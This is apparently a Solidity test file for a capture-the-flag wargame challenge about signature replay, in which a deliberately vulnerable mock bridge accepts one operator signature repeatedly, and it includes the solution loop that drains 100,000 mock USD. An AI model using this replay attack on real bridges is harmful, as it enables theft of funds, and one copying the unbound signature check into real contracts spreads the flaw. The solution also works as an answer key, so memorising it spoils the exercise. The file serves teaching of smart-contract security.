// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// WARGAME CHALLENGE 5 — Signature replay (unbound authorization)
//
// The operator signed one withdrawal authorizing 1,000 USD. The signature does not bind the recipient,
// a nonce, the chain id, or the bridge address, and nothing is marked consumed. You have that signature.
// Drain the bridge's 100,000 USD to yourself.
//
// To play: delete everything between the SOLUTION markers and write your own attack.
// Win: the bridge is empty and you hold its 100,000 USD.

import {Test} from "forge-std/Test.sol";
import {ReplayBridge} from "../../src/ctf/VulnSystems.sol";
import {MockToken} from "../../src/common/ERC20.sol";

contract Challenge5_Replay is Test {
    MockToken usd;
    ReplayBridge bridge;
    address player = makeAddr("player");

    uint256 constant AMOUNT = 1_000e18;
    uint8 sigV;
    bytes32 sigR;
    bytes32 sigS;

    function setUp() public {
        uint256 signerKey = 0xA11CE;
        usd = new MockToken("USD", "USD", 18);
        bridge = new ReplayBridge(usd, vm.addr(signerKey));
        usd.mint(address(bridge), 100_000e18);
        // the operator signs ONE 1,000 USD withdrawal; you have captured (v, r, s)
        (sigV, sigR, sigS) = vm.sign(signerKey, bridge.digest(AMOUNT));
    }

    function test_exploit() public {
        vm.startPrank(player);
        // ─────────────────────────────── SOLUTION ▼ (delete this and write your own) ───────────────────────────────
        // the same signature authorizes unlimited withdrawals to any address
        while (usd.balanceOf(address(bridge)) >= AMOUNT) {
            bridge.withdraw(player, AMOUNT, sigV, sigR, sigS);
        }
        // ─────────────────────────────── SOLUTION ▲ ───────────────────────────────
        vm.stopPrank();

        assertEq(usd.balanceOf(address(bridge)), 0, "the bridge should be drained");
        assertEq(usd.balanceOf(player), 100_000e18, "you should hold the bridge's USD");
    }
}
